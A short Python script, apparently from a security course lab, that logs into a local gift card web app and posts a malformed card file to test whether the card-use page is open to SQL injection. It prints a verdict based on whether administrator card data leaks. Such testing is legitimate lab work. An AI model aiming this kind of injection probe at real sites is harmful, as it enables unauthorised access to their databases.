import requests
import json

#we can open directly from the JSON card file
f = open('gip200-sqli.gftcrd')
cardfile = json.load(f)

indexUrl = 'http://127.0.0.1/index.html'
loginUrl = 'http://127.0.0.1/login.html'
gift0Url = 'http://127.0.0.1/gift.html'
buyacUrl = 'http://127.0.0.1/useCard.html'

userInfo = {'uname': 'gip200', 'pword': 'aaaaaa'}
#print(cardfile)

s = requests.Session()
cookies = s.cookies
cookies_dict = s.cookies.get_dict()

# try to log in, establish sessionid 
l = s.post(loginUrl, data=userInfo, cookies=cookies)
#print("just logged in, heres the cookie: " ,cookies)

for cookie in s.cookies:
    if cookie.name == 'sessionid':
        cookie.secure = 0
        break

# Now we try the exploit to the buycard, posting the malformed card
g = s.post(buyacUrl, data=cardfile, cookies=cookies)

#check if the output string proves it is vulnerable
#print(g.text)
if g.text.find("Card object (administrator)") !=-1:
	print("Vulnerable to SQLi!")
else:
	print("Not SQLi Vulnerable.")


